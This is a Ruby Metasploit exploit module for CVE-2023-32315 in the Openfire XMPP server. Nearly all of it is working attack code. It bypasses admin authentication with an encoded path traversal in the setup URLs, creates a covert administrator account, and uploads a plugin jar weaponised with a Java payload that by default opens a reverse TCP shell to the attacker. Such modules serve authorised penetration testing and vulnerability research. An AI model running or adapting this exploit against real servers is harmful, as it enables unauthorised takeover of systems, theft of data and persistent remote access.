##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/zip'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Openfire authentication bypass with RCE plugin',
        'Description' => %q{
          Openfire is an XMPP server licensed under the Open Source Apache License.
          Openfire's administrative console, a web-based application, was found to be vulnerable to a path traversal attack
          via the setup environment. This permitted an unauthenticated user to use the unauthenticated Openfire Setup Environment
          in an already configured Openfire environment to access restricted pages in the Openfire Admin Console reserved for
          administrative users.
          This module will use the vulnerability to create a new admin user that will be used to upload a Openfire management plugin
          weaponised with java native payload that triggers an RCE.
          This vulnerability affects all versions of Openfire that have been released since April 2015, starting with version 3.10.0.
          The problem has been patched in Openfire release 4.7.5 and 4.6.8, and further improvements will be included in the
          first version on the 4.8 branch, which is version 4.8.0.
        },
        'Author' => [
          'h00die-gr3y <h00die.gr3y[at]gmail.com>' # Metasploit module
        ],
        'References' => [
          ['CVE', '2023-32315'],
          ['URL', 'https://attackerkb.com/topics/7Tf5YGY3oT/cve-2023-32315'],
          ['URL', 'https://github.com/miko550/CVE-2023-32315'],
          ['URL', 'https://github.com/igniterealtime/Openfire/security/advisories/GHSA-gw42-f939-fhvm']
        ],
        'License' => MSF_LICENSE,
        'Platform' => [ 'java' ],
        'Privileged' => false,
        'Arch' => [ ARCH_JAVA ],
        'Targets' => [
          [
            'Java Universal',
            {
              'Platform' => 'java',
              'Arch' => ARCH_JAVA,
              'DefaultOptions' => {
                'PAYLOAD' => 'java/shell/reverse_tcp'
              }
            }
          ]
        ],
        'DefaultTarget' => 0,
        'DisclosureDate' => '2023-05-26',
        'DefaultOptions' => {
          'SSL' => false,
          'RPORT' => 9090
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS],
          'Reliability' => [REPEATABLE_SESSION]
        }
      )
    )
    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path to the web application', '/']),
        OptString.new('PLUGINNAME', [ false, 'Openfire plugin base name, (default: random)' ]),
        OptString.new('PLUGINAUTHOR', [ false, 'Openfire plugin author, (default: random)' ]),
        OptString.new('PLUGINDESC', [ false, 'Openfire plugin description, (default: random)' ]),
        OptString.new('ADMINNAME', [ false, 'Openfire admin user name, (default: random)' ]),
      ]
    )
  end

  def get_version
    # get Openfire version number from the admin console login page
    openfire_version = nil
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'login.jsp'),
      'ctype' => 'application/x-www-form-urlencoded'
    })
    if res && res.code == 200
      version = res.body.match(/Openfire,\s*\D*:\s*\d\.\d{1,2}\.\d/)
      openfire_version = Rex::Version.new(version[0].split(':')[1].strip) unless version.nil?
    end

    openfire_version
  end

  def auth_bypass
    # bypass authentication using path traversal vulnerability and return true if cookie_jar is filled (JSESSION-ID and CSRF) else return false.
    send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'setup', 'setup-s', '%u002e%u002e/%u002e%u002e/user-groups.jsp'),
      'ctype' => 'application/x-www-form-urlencoded',
      'keep_cookies' => true
    })
    return false if cookie_jar.cookies.empty?

    cookie_jar.cookies.each do |cookie|
      print_status(cookie.to_s)
    end
    return true
  end

  def add_admin_user
    # add an admin user using path traversal vulnerability using the cookies retrieved from authentication bypass.
    # returns admin login hash with random generated username and password
    @admin_login = {}
    username = datastore['ADMINNAME'] || Rex::Text.rand_text_alpha_lower(8..15)
    password = Rex::Text.rand_password(8..10)
    cookie_jar.cookies.each do |cookie|
      @csrf_token = cookie.to_s.split('=')[1].strip unless cookie.to_s.match(/csrf=/).nil?
    end

    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'setup', 'setup-s', '%u002e%u002e/%u002e%u002e/user-create.jsp'),
      'ctype' => 'application/x-www-form-urlencoded',
      'keep_cookies' => true,
      'vars_get' => {
        'csrf' => @csrf_token.to_s,
        'username' => username.to_s,
        'password' => password.to_s,
        'passwordConfirm' => password.to_s,
        'isadmin' => 'on',
        'create' => 'Create+User'
      }
    })
    # path traversal throws a java exception error 500 and/or returns a 200 OK code not matter if the user is added or not,
    # so we have to check during the login of the new admin user if we have been successful here
    if res && res.code == 200 || res.code == 500
      @admin_login['username'] = username
      @admin_login['password'] = password
    end
    return @admin_login
  end

  def login_admin_user
    # login using admin hash with admin username and password
    # returns true if login successful else returns false
    cookie_jar.cookies.each do |cookie|
      @csrf_token = cookie.to_s.split('=')[1].strip unless cookie.to_s.match(/csrf=/).nil?
    end

    res = send_request_cgi!({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'login.jsp'),
      'ctype' => 'application/x-www-form-urlencoded',
      'keep_cookies' => true,
      'vars_post' => {
        'url' => '%2Findex.jsp',
        'login' => 'true',
        'csrf' => @csrf_token.to_s,
        'username' => @admin_login['username'].to_s,
        'password' => @admin_login['password'].to_s
      }
    })
    if res && res.code == 200 && res.body.match(/login box/).nil?
      store_valid_credential(user: @admin_login['username'], private: @admin_login['password'], proof: cookie_jar.cookies)
      return true
    else
      return false
    end
  end

  def prepare_plugin_jar
    # prepares the plugin foundation that will host the payload
    files = [
      [ 'logo_large.gif' ],
      [ 'logo_small.gif' ],
      [ 'readme.html' ],
      [ 'changelog.html' ],
      [ 'lib', 'plugin-metasploit.jar' ]
    ]

    jar = Rex::Zip::Jar.new
    jar.add_files(files, File.join(Msf::Config.data_directory, 'exploits', 'openfire_plugin'))

    @plugin_name = datastore['PLUGINNAME'] || Rex::Text.rand_text_alphanumeric(8..15)
    plugin_author = datastore['PLUGINAUTHOR'] || Rex::Text.rand_text_alphanumeric(8..15)
    plugin_desc = datastore['PLUGINDESC'] || Rex::Text.rand_text_alphanumeric(8..15)

    plugin_xml = File.binread(File.join(Msf::Config.data_directory, 'exploits', 'openfire_plugin', 'plugin.xml'))
    plugin_xml.gsub!(/PLUGINNAME/, @plugin_name)
    plugin_xml.gsub!(/PLUGINDESCRIPTION/, plugin_desc)
    plugin_xml.gsub!(/PLUGINAUTHOR/, plugin_author)

    jar.add_file('plugin.xml', plugin_xml)
    return jar
  end

  def upload_and_execute_plugin(plugin_jar)
    # upload and execute Openfire plugin with encoded payload
    # returns true if upload is successful else returns false

    # construct multipart form data
    form_data = Rex::MIME::Message.new
    form_data.add_part(plugin_jar.to_s, 'application/x-java-archive', 'binary', "form-data; name=\"uploadfile\"; filename=\"#{@plugin_name}.jar\"")

    # extract the csrf token
    cookie_jar.cookies.each do |cookie|
      @csrf_token = cookie.to_s.split('=')[1].strip unless cookie.to_s.match(/csrf=/).nil?
    end

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'plugin-admin.jsp'),
      'ctype' => "multipart/form-data; boundary=#{form_data.bound}",
      'keep_cookies' => true,
      'data' => form_data.to_s,
      'vars_get' => {
        'uploadplugin' => nil,
        'csrf' => @csrf_token.to_s
      }
    })
    # with a successfull upload and execution of the plugin, no response is returned.
    return true unless res
    # safety check if, for whatever reason, we get a 302 response back
    if res.code == 302 && res.headers.to_s.match(/uploadsuccess=true/)
      return true
    else
      return false
    end
  end

  def check
    openfire_version = get_version
    return CheckCode::Safe if openfire_version.nil?
    # check first for patched versions
    return CheckCode::Safe("Openfire version is #{openfire_version}") if openfire_version == Rex::Version.new('4.6.8')
    return CheckCode::Safe("Openfire version is #{openfire_version}") if openfire_version == Rex::Version.new('4.7.5')
    return CheckCode::Safe("Openfire version is #{openfire_version}") if openfire_version == Rex::Version.new('4.8.0')

    if openfire_version < Rex::Version.new('4.8.0') && openfire_version >= Rex::Version.new('3.10.0')
      CheckCode::Appears("Openfire version is #{openfire_version}")
    else
      CheckCode::Safe("Openfire version is #{openfire_version}")
    end
  end

  def exploit
    # gain access exploiting path traversal vulnerability
    print_status('Grabbing the cookies.')
    fail_with(Failure::NoAccess, 'Authentication bypass is not successful.') unless auth_bypass

    # add a new admin user
    print_status('Adding a new admin user.')
    fail_with(Failure::NoAccess, 'Adding a new admin user is not successful.') if add_admin_user.empty?

    # login with new admin account
    print_status("Logging in with admin user \"#{@admin_login['username']}\" and password \"#{@admin_login['password']}\".")
    fail_with(Failure::NoAccess, 'Login is not successful.') unless login_admin_user

    # prepare Openfire plugin with payload
    plugin = prepare_plugin_jar
    plugin.add_file("lib/#{rand_text_alphanumeric(8)}.jar", payload.encoded_jar.pack)
    plugin.build_manifest

    # upload and execute Openfire plugin with payload
    print_status("Upload and execute plugin \"#{@plugin_name}\" with payload \"#{datastore['PAYLOAD']}\".")
    fail_with(Failure::PayloadFailed, 'Upload and/or execution of the plugin is not successful.') unless upload_and_execute_plugin(plugin.pack)

    # cover our tracks!!!
    # remove plugin and newly added admin user
    # Automatic removal of plugin and admin user might cause instability in the application,
    # so remove it manually in Openfire Management console after the exploit is completed.
    print_warning("Plugin \"#{@plugin_name}\" need manually clean-up via Openfire Admin console.")
    print_warning("Admin user \"#{@admin_login['username']}\" need manually clean-up via Openfire Admin console.")
  end
end
